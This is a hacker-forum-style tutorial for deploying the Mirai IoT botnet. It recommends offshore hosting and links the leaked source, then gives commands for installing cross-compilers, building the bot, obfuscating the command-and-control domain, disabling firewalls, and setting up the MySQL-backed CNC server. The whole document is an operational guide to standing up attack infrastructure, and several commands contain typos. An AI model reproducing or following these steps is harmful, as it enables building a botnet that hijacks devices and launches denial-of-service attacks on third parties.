[#] Mirai Tutorial [#]

@   _____  ._____________    _____  .___ @
@  /     \ |   \______   \  /  _  \ |   |@
@ /  \ /  \|   ||       _/ /  /_\  \|   |@
@/    Y    \   ||    |   \/    |    \   |@
@\____|__  /___||____|_  /\____|__  /___|@
@        \/            \/         \/     @
By: Jihadi4Potus/Jihadi4Prez
qTox: Jihadi@toxme.io
youtube video: https://www.youtube.com/watch?v=G4vUp3ydjs0

* REQUIREMENTS *
- 2x Debian 8 Offshore boxes - Providers. [x0]
- Mirai Source - https://github.com/jgamblin/Mirai-Source-Code git clone https://github.com/jgamblin/Mirai-Source-Code
- Good Instruction following skillz.

[x0] -Hosting Providers.
https://www.nforce.com/
http://ampnode.com/vps.html
http://www.novogara.com/
https://www.dataclub.biz/ (Accepts Everything but Paypal.)

;This is a fully tutorial how to setup mirai from scratch. ENJOY :)
;This fixes golang errors when ./build debug telnet , is executed.

	-Step One; Install the following on a Debian box. ex. Debian 7 x86_64-
 apt-get update -y
 apt-get upgrade -y
 apt-get install gcc golang electric-fence sudo git -y
 apt-get install mysql-server mysql-client -y

	-Step Two; Installing and compiling the cross-compilers-
;If you run build.sh in /mirai folder you will get an error for armv6l, In the main tutorial this wasn't included so I added it to make life easier.

 mkdir /etc/xcompile
 cd /etc/xcompile
 
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
 wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
 
 tar -jxf cross-compiler-armv4l.tar.bz2
 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-m68k.tar.bz2
 tar -jxf cross-compiler-mips.tar.bz2
 tar -jxf cross-compiler-mipsel.tar.bz2
 tar -jxf cross-compiler-powerpc.tar.bz2
 tar -jxf cross-compiler-sh4.tar.bz2
 tar -jxf cross-compiler-sparc.tar.bz2
 tar -jxf cross-compiler-armv6l.tar.bz2
 
 rm *.tar.bz2
 mv cross-compiler-armv4l armv4l
 mv cross-compiler-i586 i586
 mv cross-compiler-m68k m68k
 mv cross-compiler-mips mips
 mv cross-compiler-mipsel mipsel
 mv cross-compiler-powerpc powerpc
 mv cross-compiler-sh4 sh4
 mv cross-compiler-sparc sparc
 mv cross-compiler-armv6l armv6l
	
	-Step Three-
;Execute these in your ssh terminal, this will add to your ~/.bashrc
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin

export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

	-Step Four-
./build.sh debug telnet
;Once you execute this in the main mirai directory ./Mirai-Source-Code/mirai, If you did this command before step 2 & 3 you would get an error about the Mysql and sql-drivers, since that's what alot of people have had trouble with. This fixes that.
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords


	-Step Five; obfuscated string-
;I'm running Debian 8 x86_64 so this might be diffrent for you, but the ./debug/enc string {Domain.com} wasn't working for me so the fix is below, make sure you're in /mirai/debug
 ./enc string changeme.com
;Now add this to your table.c file.



	-Step Six; Database setup-
;Now where going to setup the database permissions and users.
;If you have iptbales/ip6tables or any firewall install disable it.

service iptables stop
/etc/ini.d/iptbales stop

;Database setup
/usr/bin/mysql_secure_installation
;It will ask you to set a password, make sure you remember this.
;Edit your main.go in /cnc/
ex: 120.0.0.1:3306
;Once you've done the step above were going to add the database and user perms. follow this link.
;Create the database first
create database mirai;
;Next select the database
use mirai
;Copy and paste this into your terminal. (Not the pastebin link, the actual code on the site.)
http://pastebin.com/BsSWnK7i
;Set the credentials you used in the ./cnc/main.go file. It should look like this- http://prntscr.com/dnskj5
;Now your server should be online
Service mysql restart
;Once you restart the mysql server, go to your debug folder ./mirai/release you will seen a compiled file named cnc execute it.
./cnc
;You should see - http://prntscr.com/dnsluv
;Now your going to have to move the prompt.txt file in mirai main directory into the release folder 
;Now you can login through your ssh client with telnet.


Congrats you setup mirai successfully!!